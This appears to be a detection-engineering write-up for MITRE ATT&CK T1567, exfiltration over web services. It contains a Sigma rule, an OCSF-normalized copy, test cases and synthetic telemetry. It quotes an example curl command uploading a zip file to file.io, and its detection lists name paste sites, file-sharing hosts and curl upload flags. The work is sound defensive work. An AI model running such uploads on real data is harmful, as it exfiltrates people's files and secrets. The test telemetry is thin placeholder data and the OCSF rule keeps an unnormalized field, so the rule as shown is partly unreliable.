### 1. Technique Breakdown: T1567

* What it is: Exfiltration Over Web Service. Adversaries exfiltrate stolen data by posting it to public web services (such as pastebins, temporary file-sharing portals, or API endpoints of online utilities) rather than standard cloud storage. They configure scripting engines (like PowerShell) or file-transfer binaries (like `curl.exe`) to execute HTTP POST requests targeting these services. Since these web services are legitimate, their outbound traffic is often allowed through corporate firewalls.
* Log Source Requirements: Sysmon Network Connection logs (Event ID 3) and Process Creation logs (Event ID 1) capturing web request parameters.
* Coverage Check:
    * HIDS (Sysmon + Wazuh): YES. Sysmon Event ID 3 logs the destination hostname of network sockets initiated by scripting utilities. Event ID 1 captures command line details (e.g. `curl -F "file=@data.zip" https://file.io`).
    * NIDS (Suricata + Zeek): YES. Network monitoring records SSL SNI negotiations or HTTP requests to public paste/file sharing domains.

---

### 2. Custom Sigma Rule

```yaml
title: Exfiltration - Data Upload to Public Web Service (AN1511)
id: 317f128d-a86a-452e-a057-789849c2b71f
status: experimental
description: Detects command-line interpreters or file transfer tools initiating network connections or sending HTTP requests to known pastebin or temporary file-sharing web services, which may indicate data exfiltration.
author: Krishna Gupta
date: 2026-06-08
logsource:
    category: network_connection
    product: windows
    # Relies on Sysmon Event ID 3/Event ID 1
detection:
    selection_process:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\curl.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    selection_domains_host:
        DestinationHostname|contains:
            - 'pastebin.com'
            - 'paste.ee'
            - 'hastebin.com'
            - 'file.io'
            - 'gofile.io'
            - 'sendspace.com'
            - 'anonfiles.com'
            - 'transfer.sh'
            - 'mega.nz'
            - 'temp.sh'
    selection_domains_cmd:
        CommandLine|contains:
            - 'pastebin'
            - 'file.io'
            - 'gofile'
            - 'transfer.sh'
            - ' -F ' # curl form-data upload flag
            - ' -d ' # curl post data flag
            - 'UploadFile'
            - 'PostAsync'
    condition: selection_process and (selection_domains_host or selection_domains_cmd)
fields:
    - Image
    - CommandLine
    - User
    - LogonId
    - Initiated
    - SourceIp
    - DestinationIp
    - DestinationPort
falsepositives:
    - Developers using curl or PowerShell to share debugging logs or build outputs on public paste bins.
    - Automated system status monitoring scripts configured to post status details to external developer dashboards.
level: high
tags:
    - attack.exfiltration
    - attack.t1567
    - analytic.an1511
    - detection.det0548
```

---

### 3. OCSF Normalized Rule

```yaml
title: 'Exfiltration - Data Upload to Public Web Service (AN1511) (OCSF-Normalized)'
id: '317f128d-a86a-452e-a057-789849c2b71f'
status: experimental
description: 'OCSF Normalized rule for Exfiltration - Data Upload to Public Web Service (AN1511)'
author: Krishna Gupta
logsource:
    product: ocsf
    class: network_activity
detection:
    selection_process:
        process.file.path|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\curl.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    selection_domains_host:
        DestinationHostname|contains:
            - 'pastebin.com'
            - 'paste.ee'
            - 'hastebin.com'
            - 'file.io'
            - 'gofile.io'
            - 'sendspace.com'
            - 'anonfiles.com'
            - 'transfer.sh'
            - 'mega.nz'
            - 'temp.sh'
    selection_domains_cmd:
        process.cmd_line|contains:
            - 'pastebin'
            - 'file.io'
            - 'gofile'
            - 'transfer.sh'
            - ' -F ' # curl form-data upload flag
            - ' -d ' # curl post data flag
            - 'UploadFile'
            - 'PostAsync'
    condition: selection_process and (selection_domains_host or selection_domains_cmd)
fields:
    - time
level: high
tags:
    - attack.exfiltration
    - attack.t1567
    - analytic.an1511
    - detection.det0548
```

---

### 4. Blind Spots & Tuning (The "Problems")

- Authorized IT administration activities.
- Tune with allowlists for known trusted execution paths.

---

### 5. Test Cases (Engine Pipeline Verification)

#### True Positives
* True Positive 1A: Standard Execution (Exfiltration - Data Upload to Public Web Service (AN1511))
  * The Log: Activity simulating malicious behavior.
  * Expected Outcome: MUST trigger an alert.

* True Positive 1B: Malformed JSON Robustness Test (Exfiltration - Data Upload to Public Web Service (AN1511))
  * The Log: Simulating 1A but intentionally omitting the `unmapped` object entirely.
  * Expected Outcome: Engine parser should degrade gracefully. MUST trigger an alert.

* True Positive 1C: Schema Type Validation Failure (Exfiltration - Data Upload to Public Web Service (AN1511))
  * The Log: Exact match of 1A, but `activity_id` is passed as a string `"1"` instead of an integer `1`.
  * Expected Outcome: Tests if the engine's JSON parser coerces the type gracefully. MUST trigger an alert.

* True Positive 1D: Exact Duplicate Event (Exfiltration - Data Upload to Public Web Service (AN1511))
  * The Log: Exact duplicate of 1A with the exact same timestamp.
  * Expected Outcome: Tests deduplication window.

#### Benign / True Negatives
* Benign 1: Allowed Activity (Exfiltration - Data Upload to Public Web Service (AN1511))
  * The Log: Activity matching legitimate patterns.
  * Expected Outcome: Matches exclusion filters. MUST NOT trigger an alert.

---

### 6. Raw Telemetry Dataset (OCSF JSON)

#### Benign Telemetry
```jsonl
{"category_uid": 4, "class_uid": 4001, "class_name": "Network Activity", "activity_name": "Traffic", "dst_endpoint": {"ip": "10.0.0.1", "port": 80}, "src_endpoint": {"ip": "192.168.1.100", "port": 50000}, "unmapped": {"generic": "benign_test"}, "metadata": {"test_case": "TN-01", "description": "Exfiltration - Data Upload to Public Web Service (AN1511) (TN-01)", "expected_alert": false, "rule_uid": "317f128d-a86a-452e-a057-789849c2b71f"}, "activity_id": 1, "time": 1718000010}
```

#### True Positive Telemetry
```jsonl
{"category_uid": 4, "class_uid": 4001, "class_name": "Network Activity", "activity_name": "Traffic", "dst_endpoint": {"ip": "10.0.0.1", "port": 80}, "src_endpoint": {"ip": "192.168.1.100", "port": 50000}, "unmapped": {"dummy": "data"}, "process": {"file": {"path": "C:\\Temp\\powershell.exe"}, "cmd_line": "C:\\Windows\\System32\\cmd.exe /c pastebin"}, "metadata": {"test_case": "TP-01A", "description": "Exfiltration - Data Upload to Public Web Service (AN1511) (TP-01A)", "expected_alert": true, "rule_uid": "317f128d-a86a-452e-a057-789849c2b71f"}, "activity_id": 1, "time": 1718000100}
{"category_uid": 4, "class_uid": 4001, "class_name": "Network Activity", "activity_name": "Traffic", "dst_endpoint": {"ip": "10.0.0.1", "port": 80}, "src_endpoint": {"ip": "192.168.1.100", "port": 50000}, "process": {"file": {"path": "C:\\Temp\\powershell.exe"}, "cmd_line": "C:\\Windows\\System32\\cmd.exe /c pastebin"}, "metadata": {"test_case": "TP-01B", "description": "Exfiltration - Data Upload to Public Web Service (AN1511) (TP-01B)", "expected_alert": true, "rule_uid": "317f128d-a86a-452e-a057-789849c2b71f"}, "activity_id": 1, "time": 1718000101}
{"category_uid": 4, "class_uid": 4001, "class_name": "Network Activity", "activity_name": "Traffic", "dst_endpoint": {"ip": "10.0.0.1", "port": 80}, "src_endpoint": {"ip": "192.168.1.100", "port": 50000}, "unmapped": {"dummy": "data"}, "process": {"file": {"path": "C:\\Temp\\powershell.exe"}, "cmd_line": "C:\\Windows\\System32\\cmd.exe /c pastebin"}, "metadata": {"test_case": "TP-01C", "description": "Exfiltration - Data Upload to Public Web Service (AN1511) (TP-01C)", "expected_alert": true, "rule_uid": "317f128d-a86a-452e-a057-789849c2b71f"}, "activity_id": "1", "time": 1718000102}
{"category_uid": 4, "class_uid": 4001, "class_name": "Network Activity", "activity_name": "Traffic", "dst_endpoint": {"ip": "10.0.0.1", "port": 80}, "src_endpoint": {"ip": "192.168.1.100", "port": 50000}, "unmapped": {"dummy": "data"}, "process": {"file": {"path": "C:\\Temp\\powershell.exe"}, "cmd_line": "C:\\Windows\\System32\\cmd.exe /c pastebin"}, "metadata": {"test_case": "TP-01D", "description": "Exfiltration - Data Upload to Public Web Service (AN1511) (TP-01D)", "expected_alert": true, "rule_uid": "317f128d-a86a-452e-a057-789849c2b71f"}, "activity_id": 1, "time": 1718000100}
```
